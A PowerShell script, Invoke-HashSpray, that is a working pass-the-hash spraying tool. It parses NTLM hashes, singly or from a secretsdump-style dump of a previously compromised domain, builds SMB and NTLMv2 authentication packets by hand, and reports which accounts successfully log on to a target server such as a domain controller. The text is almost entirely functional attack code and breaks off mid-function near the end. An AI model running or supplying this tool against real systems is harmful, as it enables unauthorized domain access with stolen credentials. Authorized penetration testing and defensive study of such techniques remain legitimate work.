function Invoke-HashSpray {
<#
.SYNOPSIS
    Try to authenticate with accounts' password hashes.

    Author: Timothee MENOCHET (@TiM0)

.DESCRIPTION
    Invoke-HashSpray check accounts' NTLM hashes against a target system over SMB.
    This function can be used to identify credential reuse between a previously compromised domain and a target domain.
    It is mostely stolen from Invoke-TheHash written by @kevin_robertson.

.PARAMETER Server
    Specifies the target server (e.g a domain controller).

.PARAMETER Domain
    Specifies the domain to use for authentication. This parameter is not needed with local accounts or when using a UserPrincipalName as username.

.PARAMETER Username
    Specifies the identifier of an account to use for authentication.

.PARAMETER Hash
    Specifies the NTLM password hash for authentication. This module will accept either LM:NTLM or NTLM format.

.PARAMETER DumpFile
    Specifies a dump file containing NTLM password hashes in the format <domain>\<username>:<uid>:<LM-hash>:<NT-hash>:<comment>:<homedir>: (e.g secretsdump's output).

.EXAMPLE
    PS C:\> Invoke-HashSpray -Server DC.ADATUM.CORP -Username testuser@adatum.corp -Hash F6F38B793DB6A94BA04A52F1D3EE92F0

.EXAMPLE
    PS C:\> Invoke-HashSpray -Server DC.ADATUM.CORP -Domain ADATUM -DumpFile contoso.ntds
#>

    [CmdletBinding(DefaultParametersetName='Default')]
    param (
        [parameter(Mandatory=$true)]
        [String]
        $Server,

        [parameter(Mandatory=$false)]
        [String]
        $Domain,

        [parameter(ParameterSetName='Auth', Mandatory=$false)]
        [String]
        $Username,

        [parameter(ParameterSetName='Auth', Mandatory=$false)]
        [ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})]
        [String]
        $Hash,

        [parameter(ParameterSetName='DumpFile', Mandatory=$false)]
        [String]
        $DumpFile,

        [parameter(Mandatory=$false)]
        [ValidateSet("Auto","1","2.1")]
        [String]
        $Version="Auto"
    )

    If($Version -eq '1') {
        $SMB_version = 'SMB1'
    }
    ElseIf($Version -eq '2.1') {
        $SMB_version = 'SMB2.1'
    }

    If($PsCmdlet.ParameterSetName -ne 'Auth' -and $PsCmdlet.ParameterSetName -ne 'DumpFile') {
        Write-Error 'No password hash provided.'
    }

    function ConvertFrom-PacketOrderedDictionary {
        param($OrderedDictionary)

        ForEach($field in $OrderedDictionary.Values) {
            $byte_array += $field
        }

        return $byte_array
    }

    # NetBIOS

    function New-PacketNetBIOSSessionService {
        param([Int]$HeaderLength,[Int]$DataLength)

        [Byte[]]$length = ([System.BitConverter]::GetBytes($HeaderLength + $DataLength))[2..0]

        $NetBIOSSessionService = New-Object System.Collections.Specialized.OrderedDictionary
        $NetBIOSSessionService.Add("MessageType",[Byte[]](0x00))
        $NetBIOSSessionService.Add("Length",$length)

        return $NetBIOSSessionService
    }

    # SMB1

    function New-PacketSMBHeader {
        param([Byte[]]$Command,[Byte[]]$Flags,[Byte[]]$Flags2,[Byte[]]$TreeID,[Byte[]]$ProcessID,[Byte[]]$UserID)

        $ProcessID = $ProcessID[0,1]

        $SMBHeader = New-Object System.Collections.Specialized.OrderedDictionary
        $SMBHeader.Add("Protocol",[Byte[]](0xff,0x53,0x4d,0x42))
        $SMBHeader.Add("Command",$Command)
        $SMBHeader.Add("ErrorClass",[Byte[]](0x00))
        $SMBHeader.Add("Reserved",[Byte[]](0x00))
        $SMBHeader.Add("ErrorCode",[Byte[]](0x00,0x00))
        $SMBHeader.Add("Flags",$Flags)
        $SMBHeader.Add("Flags2",$Flags2)
        $SMBHeader.Add("ProcessIDHigh",[Byte[]](0x00,0x00))
        $SMBHeader.Add("Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $SMBHeader.Add("Reserved2",[Byte[]](0x00,0x00))
        $SMBHeader.Add("TreeID",$TreeID)
        $SMBHeader.Add("ProcessID",$ProcessID)
        $SMBHeader.Add("UserID",$UserID)
        $SMBHeader.Add("MultiplexID",[Byte[]](0x00,0x00))

        return $SMBHeader
    }

    function New-PacketSMBNegotiateProtocolRequest {
        param([String]$Version)

        if($Version -eq 'SMB1') {
            [Byte[]]$byte_count = 0x0c,0x00
        }
        else {
            [Byte[]]$byte_count = 0x22,0x00  
        }

        $SMBNegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $SMBNegotiateProtocolRequest.Add("WordCount",[Byte[]](0x00))
        $SMBNegotiateProtocolRequest.Add("ByteCount",$byte_count)
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat",[Byte[]](0x02))
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name",[Byte[]](0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00))

        if($version -ne 'SMB1') {
            $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat2",[Byte[]](0x02))
            $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name2",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00))
            $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat3",[Byte[]](0x02))
            $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name3",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x3f,0x3f,0x3f,0x00))
        }

        return $SMBNegotiateProtocolRequest
    }

    function New-PacketSMBSessionSetupAndXRequest {
        param([Byte[]]$SecurityBlob)

        [Byte[]]$byte_count = [System.BitConverter]::GetBytes($SecurityBlob.Length)[0,1]
        [Byte[]]$security_blob_length = [System.BitConverter]::GetBytes($SecurityBlob.Length + 5)[0,1]

        $SMBSessionSetupAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $SMBSessionSetupAndXRequest.Add("WordCount",[Byte[]](0x0c))
        $SMBSessionSetupAndXRequest.Add("AndXCommand",[Byte[]](0xff))
        $SMBSessionSetupAndXRequest.Add("Reserved",[Byte[]](0x00))
        $SMBSessionSetupAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
        $SMBSessionSetupAndXRequest.Add("MaxBuffer",[Byte[]](0xff,0xff))
        $SMBSessionSetupAndXRequest.Add("MaxMpxCount",[Byte[]](0x02,0x00))
        $SMBSessionSetupAndXRequest.Add("VCNumber",[Byte[]](0x01,0x00))
        $SMBSessionSetupAndXRequest.Add("SessionKey",[Byte[]](0x00,0x00,0x00,0x00))
        $SMBSessionSetupAndXRequest.Add("SecurityBlobLength",$byte_count)
        $SMBSessionSetupAndXRequest.Add("Reserved2",[Byte[]](0x00,0x00,0x00,0x00))
        $SMBSessionSetupAndXRequest.Add("Capabilities",[Byte[]](0x44,0x00,0x00,0x80))
        $SMBSessionSetupAndXRequest.Add("ByteCount",$security_blob_length)
        $SMBSessionSetupAndXRequest.Add("SecurityBlob",$SecurityBlob)
        $SMBSessionSetupAndXRequest.Add("NativeOS",[Byte[]](0x00,0x00,0x00))
        $SMBSessionSetupAndXRequest.Add("NativeLANManage",[Byte[]](0x00,0x00))

        return $SMBSessionSetupAndXRequest 
    }

    # SMB2

    function New-PacketSMB2Header {
        param([Byte[]]$Command,[Byte[]]$CreditRequest,[Bool]$Signing,[Int]$MessageID,[Byte[]]$ProcessID,[Byte[]]$TreeID,[Byte[]]$SessionID)

        if($Signing) {
            $flags = 0x08,0x00,0x00,0x00      
        }
        else {
            $flags = 0x00,0x00,0x00,0x00
        }

        [Byte[]]$message_ID = [System.BitConverter]::GetBytes($MessageID)

        if($message_ID.Length -eq 4) {
            $message_ID += 0x00,0x00,0x00,0x00
        }

        $SMB2Header = New-Object System.Collections.Specialized.OrderedDictionary
        $SMB2Header.Add("ProtocolID",[Byte[]](0xfe,0x53,0x4d,0x42))
        $SMB2Header.Add("StructureSize",[Byte[]](0x40,0x00))
        $SMB2Header.Add("CreditCharge",[Byte[]](0x01,0x00))
        $SMB2Header.Add("ChannelSequence",[Byte[]](0x00,0x00))
        $SMB2Header.Add("Reserved",[Byte[]](0x00,0x00))
        $SMB2Header.Add("Command",$Command)
        $SMB2Header.Add("CreditRequest",$CreditRequest)
        $SMB2Header.Add("Flags",$flags)
        $SMB2Header.Add("NextCommand",[Byte[]](0x00,0x00,0x00,0x00))
        $SMB2Header.Add("MessageID",$message_ID)
        $SMB2Header.Add("ProcessID",$ProcessID)
        $SMB2Header.Add("TreeID",$TreeID)
        $SMB2Header.Add("SessionID",$SessionID)
        $SMB2Header.Add("Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        return $SMB2Header
    }

    function New-PacketSMB2NegotiateProtocolRequest {
        $SMB2NegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $SMB2NegotiateProtocolRequest.Add("StructureSize",[Byte[]](0x24,0x00))
        $SMB2NegotiateProtocolRequest.Add("DialectCount",[Byte[]](0x02,0x00))
        $SMB2NegotiateProtocolRequest.Add("SecurityMode",[Byte[]](0x01,0x00))
        $SMB2NegotiateProtocolRequest.Add("Reserved",[Byte[]](0x00,0x00))
        $SMB2NegotiateProtocolRequest.Add("Capabilities",[Byte[]](0x40,0x00,0x00,0x00))
        $SMB2NegotiateProtocolRequest.Add("ClientGUID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $SMB2NegotiateProtocolRequest.Add("NegotiateContextOffset",[Byte[]](0x00,0x00,0x00,0x00))
        $SMB2NegotiateProtocolRequest.Add("NegotiateContextCount",[Byte[]](0x00,0x00))
        $SMB2NegotiateProtocolRequest.Add("Reserved2",[Byte[]](0x00,0x00))
        $SMB2NegotiateProtocolRequest.Add("Dialect",[Byte[]](0x02,0x02))
        $SMB2NegotiateProtocolRequest.Add("Dialect2",[Byte[]](0x10,0x02))

        return $SMB2NegotiateProtocolRequest
    }

    function New-PacketSMB2SessionSetupRequest {
        param([Byte[]]$SecurityBlob)

        [Byte[]]$security_buffer_length = ([System.BitConverter]::GetBytes($SecurityBlob.Length))[0,1]

        $SMB2SessionSetupRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $SMB2SessionSetupRequest.Add("StructureSize",[Byte[]](0x19,0x00))
        $SMB2SessionSetupRequest.Add("Flags",[Byte[]](0x00))
        $SMB2SessionSetupRequest.Add("SecurityMode",[Byte[]](0x01))
        $SMB2SessionSetupRequest.Add("Capabilities",[Byte[]](0x00,0x00,0x00,0x00))
        $SMB2SessionSetupRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
        $SMB2SessionSetupRequest.Add("SecurityBufferOffset",[Byte[]](0x58,0x00))
        $SMB2SessionSetupRequest.Add("SecurityBufferLength",$security_buffer_length)
        $SMB2SessionSetupRequest.Add("PreviousSessionID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $SMB2SessionSetupRequest.Add("Buffer",$SecurityBlob)

        return $SMB2SessionSetupRequest 
    }

    # NTLM

    function New-PacketNTLMSSPNegotiate {
        param([Byte[]]$NegotiateFlags,[Byte[]]$Version)

        [Byte[]]$NTLMSSP_length = ([System.BitConverter]::GetBytes($Version.Length + 32))[0]
        [Byte[]]$ASN_length_1 = $NTLMSSP_length[0] + 32
        [Byte[]]$ASN_length_2 = $NTLMSSP_length[0] + 22
        [Byte[]]$ASN_length_3 = $NTLMSSP_length[0] + 20
        [Byte[]]$ASN_length_4 = $NTLMSSP_length[0] + 2

        $NTLMSSPNegotiate = New-Object System.Collections.Specialized.OrderedDictionary
        $NTLMSSPNegotiate.Add("InitialContextTokenID",[Byte[]](0x60))
        $NTLMSSPNegotiate.Add("InitialcontextTokenLength",$ASN_length_1)
        $NTLMSSPNegotiate.Add("ThisMechID",[Byte[]](0x06))
        $NTLMSSPNegotiate.Add("ThisMechLength",[Byte[]](0x06))
        $NTLMSSPNegotiate.Add("OID",[Byte[]](0x2b,0x06,0x01,0x05,0x05,0x02))
        $NTLMSSPNegotiate.Add("InnerContextTokenID",[Byte[]](0xa0))
        $NTLMSSPNegotiate.Add("InnerContextTokenLength",$ASN_length_2)
        $NTLMSSPNegotiate.Add("InnerContextTokenID2",[Byte[]](0x30))
        $NTLMSSPNegotiate.Add("InnerContextTokenLength2",$ASN_length_3)
        $NTLMSSPNegotiate.Add("MechTypesID",[Byte[]](0xa0))
        $NTLMSSPNegotiate.Add("MechTypesLength",[Byte[]](0x0e))
        $NTLMSSPNegotiate.Add("MechTypesID2",[Byte[]](0x30))
        $NTLMSSPNegotiate.Add("MechTypesLength2",[Byte[]](0x0c))
        $NTLMSSPNegotiate.Add("MechTypesID3",[Byte[]](0x06))
        $NTLMSSPNegotiate.Add("MechTypesLength3",[Byte[]](0x0a))
        $NTLMSSPNegotiate.Add("MechType",[Byte[]](0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a))
        $NTLMSSPNegotiate.Add("MechTokenID",[Byte[]](0xa2))
        $NTLMSSPNegotiate.Add("MechTokenLength",$ASN_length_4)
        $NTLMSSPNegotiate.Add("NTLMSSPID",[Byte[]](0x04))
        $NTLMSSPNegotiate.Add("NTLMSSPLength",$NTLMSSP_length)
        $NTLMSSPNegotiate.Add("Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
        $NTLMSSPNegotiate.Add("MessageType",[Byte[]](0x01,0x00,0x00,0x00))
        $NTLMSSPNegotiate.Add("NegotiateFlags",$NegotiateFlags)
        $NTLMSSPNegotiate.Add("CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $NTLMSSPNegotiate.Add("CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        if($Version) {
            $NTLMSSPNegotiate.Add("Version",$Version)
        }

        return $NTLMSSPNegotiate
    }

    function New-PacketNTLMSSPAuth {
        param([Byte[]]$NTLMResponse)

        [Byte[]]$NTLMSSP_length = ([System.BitConverter]::GetBytes($NTLMResponse.Length))[1,0]
        [Byte[]]$ASN_length_1 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 12))[1,0]
        [Byte[]]$ASN_length_2 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 8))[1,0]
        [Byte[]]$ASN_length_3 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 4))[1,0]

        $NTLMSSPAuth = New-Object System.Collections.Specialized.OrderedDictionary
        $NTLMSSPAuth.Add("ASNID",[Byte[]](0xa1,0x82))
        $NTLMSSPAuth.Add("ASNLength",$ASN_length_1)
        $NTLMSSPAuth.Add("ASNID2",[Byte[]](0x30,0x82))
        $NTLMSSPAuth.Add("ASNLength2",$ASN_length_2)
        $NTLMSSPAuth.Add("ASNID3",[Byte[]](0xa2,0x82))
        $NTLMSSPAuth.Add("ASNLength3",$ASN_length_3)
        $NTLMSSPAuth.Add("NTLMSSPID",[Byte[]](0x04,0x82))
        $NTLMSSPAuth.Add("NTLMSSPLength",$NTLMSSP_length)
        $NTLMSSPAuth.Add("NTLMResponse",$NTLMResponse)

        return $NTLMSSPAuth
    }

    function Get-UInt16DataLength {
        param ([Int]$Start,[Byte[]]$Data)

        $data_length = [System.BitConverter]::ToUInt16($Data[$Start..($Start + 1)],0)

        return $data_length
    }

    $process_ID = [System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -expand id
    $process_ID = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($process_ID))
    [Byte[]]$process_ID = $process_ID.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

    $credentials = @{}
    If ($Username -and $Hash) {
        $credentials.add($Username,$Hash)
    }
    ElseIf ($DumpFile) {
        $DumpFilePath = Resolve-Path -Path $DumpFile
        ForEach ($line in Get-Content $DumpFilePath) {
            $dump = $line.Split(":")
            $username = $dump[0]
            if ($username) {
                if ($username.Contains('\')) {
                    $username = $username.split('\')[1]
                }
                $lmhash = $dump[2]
                $nthash = $dump[3]
                $hash = $lmhash + ':' + $nthash
                $credentials.add($username, $hash)
            }
        }
    }

    $credentials.GetEnumerator() | ForEach-Object {

        $username = $_.key
        $hash = $_.value
        if($hash -like "*:*") {
            $hash = $hash.SubString(($hash.IndexOf(":") + 1),32)
        }

        $client = New-Object System.Net.Sockets.TCPClient
        $client.Client.ReceiveTimeout = 5000

        try {
            $client.Connect($Server,"445")
        }
        catch {
            Write-Output "[-] $Server did not respond"
        }

        if($client.Connected) {
            $client_receive = New-Object System.Byte[] 81920

            $client_stream = $client.GetStream()
            
            if($SMB_version -eq 'SMB2.1') {
                $stage = 'NegotiateSMB2'
            }
            else {
                $stage = 'NegotiateSMB'
            }

            while($stage -ne 'Exit') {
                try {
                    switch ($stage) {
                        'NegotiateSMB' {          
                            $packet_SMB_header = New-PacketSMBHeader 0x72 0x18 0x01,0x48 0xff,0xff $process_ID 0x00,0x00       
                            $packet_SMB_data = New-PacketSMBNegotiateProtocolRequest $SMB_version
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                            $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                            $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data

                            try {
                                $client_stream.Write($client_send,0,$client_send.Length) > $null
                                $client_stream.Flush()    
                                $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                            
                                if([System.BitConverter]::ToString($client_receive[4..7]) -eq 'ff-53-4d-42') {
                                    $SMB_version = 'SMB1'
                                    $stage = 'NTLMSSPNegotiate'

                                    if([System.BitConverter]::ToString($client_receive[39]) -eq '0f') {
                                        $SMB_signing = $true
                                        $session_key_length = 0x00,0x00
                                        $negotiate_flags = 0x15,0x82,0x08,0xa0
                                    }
                                    else {
                                        $SMB_signing = $false
                                        $session_key_length = 0x00,0x00
                                        $negotiate_flags = 0x05,0x82,0x08,0xa0
                                    }
                                }
                                else {
                                    $stage = 'NegotiateSMB2'

                                    if([System.BitConverter]::ToString($client_receive[70]) -eq '03') {
                                        $SMB_signing = $true
                                        $session_key_length = 0x00,0x00
                                        $negotiate_flags = 0x15,0x82,0x08,0xa0

                                    }
                                    else {
                                        $SMB_signing = $false
                                        $session_key_length = 0x00,0x00
                                        $negotiate_flags = 0x05,0x80,0x08,0xa0
                                    }
                                }
                            }
                            catch {
                                if($_.Exception.Message -like 'Exception calling "Read" with "3" argument(s): "Unable to read data from the transport connection: An existing connection was forcibly closed by the remote host."') {
                                    Write-Output "[-] SMB1 negotiation failed"
                                    $negoitiation_failed = $true
                                    $stage = 'Exit'
                                }
                            }
                        }

                        'NegotiateSMB2' {
                            if($SMB_version -eq 'SMB2.1') {
                                $message_ID = 0
                            }
                            else {
                                $message_ID = 1
                            }

                            $tree_ID = 0x00,0x00,0x00,0x00
                            $session_ID = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                            $packet_SMB_header = New-PacketSMB2Header 0x00,0x00 0x00,0x00 $false $message_ID $process_ID $tree_ID $session_ID
                            $packet_SMB_data = New-PacketSMB2NegotiateProtocolRequest
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                            $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                            $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                            $client_stream.Write($client_send,0,$client_send.Length) > $null
                            $client_stream.Flush()    
                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                            $stage = 'NTLMSSPNegotiate'

                            if([System.BitConverter]::ToString($client_receive[70]) -eq '03') {
                                $SMB_signing = $true
                                $session_key_length = 0x00,0x00
                                $negotiate_flags = 0x15,0x82,0x08,0xa0
                            }
                            else {
                                $SMB_signing = $false
                                $session_key_length = 0x00,0x00
                                $negotiate_flags = 0x05,0x80,0x08,0xa0
                            }
                        }
                            
                        'NTLMSSPNegotiate' {
                            if($SMB_version -eq 'SMB1') {
                                $packet_SMB_header = New-PacketSMBHeader 0x73 0x18 0x07,0xc8 0xff,0xff $process_ID 0x00,0x00

                                if($SMB_signing) {
                                    $packet_SMB_header["Flags2"] = 0x05,0x48
                                }

                                $packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate $negotiate_flags
                                $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                                $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       
                                $packet_SMB_data = New-PacketSMBSessionSetupAndXRequest $NTLMSSP_negotiate
                                $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                                $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                                $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                            }
                            else {
                                $message_ID++
                                $packet_SMB_header = New-PacketSMB2Header 0x01,0x00 0x1f,0x00 $false $message_ID $process_ID $tree_ID $session_ID
                                $packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate $negotiate_flags 0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f
                                $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                                $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       
                                $packet_SMB_data = New-PacketSMB2SessionSetupRequest $NTLMSSP_negotiate
                                $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                                $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                                $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                            }

                            $client_stream.Write($client_send,0,$client_send.Length) > $null
                            $client_stream.Flush()    
                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                            $stage = 'Exit'
                        }
                    }
                }
                catch {
                    Write-Output "[-] $($_.Exception.Message)"
                    $negoitiation_failed = $true
                    $stage = 'Exit'
                }
            }

            if(!$negoitiation_failed) {
                $NTLMSSP = [System.BitConverter]::ToString($client_receive)
                $NTLMSSP = $NTLMSSP -replace "-",""
                $NTLMSSP_index = $NTLMSSP.IndexOf("4E544C4D53535000")
                $NTLMSSP_bytes_index = $NTLMSSP_index / 2
                $domain_length = Get-UInt16DataLength ($NTLMSSP_bytes_index + 12) $client_receive
                $target_length = Get-UInt16DataLength ($NTLMSSP_bytes_index + 40) $client_receive
                $session_ID = $client_receive[44..51]
                $NTLM_challenge = $client_receive[($NTLMSSP_bytes_index + 24)..($NTLMSSP_bytes_index + 31)]
                $target_details = $client_receive[($NTLMSSP_bytes_index + 56 + $domain_length)..($NTLMSSP_bytes_index + 55 + $domain_length + $target_length)]
                $target_time_bytes = $target_details[($target_details.Length - 12)..($target_details.Length - 5)]
                $NTLM_hash_bytes = (&{for ($i = 0;$i -lt $hash.Length;$i += 2){$hash.SubString($i,2)}}) -join "-"
                $NTLM_hash_bytes = $NTLM_hash_bytes.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                $auth_hostname = (Get-ChildItem -path env:computername).Value
                $auth_hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($auth_hostname)
                $auth_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($Domain)
                $auth_username_bytes = [System.Text.Encoding]::Unicode.GetBytes($username)
                $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)[0,1]
                $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)[0,1]
                $auth_username_length = [System.BitConverter]::GetBytes($auth_username_bytes.Length)[0,1]
                $auth_hostname_length = [System.BitConverter]::GetBytes($auth_hostname_bytes.Length)[0,1]
                $auth_domain_offset = 0x40,0x00,0x00,0x00
                $auth_username_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + 64)
                $auth_hostname_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + 64)
                $auth_LM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 64)
                $auth_NTLM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 88)
                $HMAC_MD5 = New-Object System.Security.Cryptography.HMACMD5
                $HMAC_MD5.key = $NTLM_hash_bytes
                $username_and_target = $username.ToUpper()
                $username_and_target_bytes = [System.Text.Encoding]::Unicode.GetBytes($username_and_target)
                $username_and_target_bytes += $auth_domain_bytes
                $NTLMv2_hash = $HMAC_MD5.ComputeHash($username_and_target_bytes)
                $client_challenge = [String](1..8 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
                $client_challenge_bytes = $client_challenge.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

                $security_blob_bytes = 0x01,0x01,0x00,0x00,
                                        0x00,0x00,0x00,0x00 +
                                        $target_time_bytes +
                                        $client_challenge_bytes +
                                        0x00,0x00,0x00,0x00 +
                                        $target_details +
                                        0x00,0x00,0x00,0x00,
                                        0x00,0x00,0x00,0x00

                $server_challenge_and_security_blob_bytes = $NTLM_challenge + $security_blob_bytes
                $HMAC_MD5.key = $NTLMv2_hash
                $NTLMv2_response = $HMAC_MD5.ComputeHash($server_challenge_and_security_blob_bytes)

                if($SMB_signing) {
                    $session_base_key = $HMAC_MD5.ComputeHash($NTLMv2_response)
                    $session_key = $session_base_key
                    $HMAC_SHA256 = New-Object System.Security.Cryptography.HMACSHA256
                    $HMAC_SHA256.key = $session_key
                }

                $NTLMv2_response = $NTLMv2_response + $security_blob_bytes
                $NTLMv2_response_length = [System.BitConverter]::GetBytes($NTLMv2_response.Length)[0,1]
                $session_key_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + $NTLMv2_response.Length + 88)

                $NTLMSSP_response = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,
                                        0x03,0x00,0x00,0x00,
                                        0x18,0x00,
                                        0x18,0x00 +
                                        $auth_LM_offset +
                                        $NTLMv2_response_length +
                                        $NTLMv2_response_length +
                                        $auth_NTLM_offset +
                                        $auth_domain_length +
                                        $auth_domain_length +
                                        $auth_domain_offset +
                                        $auth_username_length +
                                        $auth_username_length +
                                        $auth_username_offset +
                                        $auth_hostname_length +
                                        $auth_hostname_length +
                                        $auth_hostname_offset +
                                        $session_key_length +
                                        $session_key_length +
                                        $session_key_offset +
                                        $negotiate_flags +
                                        $auth_domain_bytes +
                                        $auth_username_bytes +
                                        $auth_hostname_bytes +
                                        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                        $NTLMv2_response

                if($SMB_version -eq 'SMB1') {
                    $SMB_user_ID = $client_receive[32,33]
                    $packet_SMB_header = New-PacketSMBHeader 0x73 0x18 0x07,0xc8 0xff,0xff $process_ID $SMB_user_ID

                    if($SMB_signing) {
                        $packet_SMB_header["Flags2"] = 0x05,0x48
                    }

                    $packet_SMB_header["UserID"] = $SMB_user_ID
                    $packet_NTLMSSP_negotiate = New-PacketNTLMSSPAuth $NTLMSSP_response
                    $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                    $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate      
                    $packet_SMB_data = New-PacketSMBSessionSetupAndXRequest $NTLMSSP_negotiate
                    $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                    $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                    $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                    $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                }
                else {
                    $message_ID++
                    $packet_SMB_header = New-PacketSMB2Header 0x01,0x00 0x01,0x00 $false $message_ID  $process_ID $tree_ID $session_ID
                    $packet_NTLMSSP_auth = New-PacketNTLMSSPAuth $NTLMSSP_response
                    $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                    $NTLMSSP_auth = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_auth        
                    $packet_SMB_data = New-PacketSMB2SessionSetupRequest $NTLMSSP_auth
                    $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                    $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                    $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                    $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                }

                try {
                    $client_stream.Write($client_send,0,$client_send.Length) > $null
                    $client_stream.Flush()
                    $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                    if($SMB_version -eq 'SMB1') {

                        if([System.BitConverter]::ToString($client_receive[9..12]) -eq '00-00-00-00') {
                            Write-Verbose "[+] $Username successfully authenticated on $Server"
                            Write-Output "[-] SMB1 is only supported with signing check and authentication"
                        }
                        else {
                            Write-Verbose "[!] $Username failed to authenticate on $Server"
                        }
                    }
                    else {
                        if([System.BitConverter]::ToString($client_receive[12..15]) -eq '00-00-00-00') {
                            Write-Output "[+] $Username successfully authenticated on $Server"
                        }
                        else {
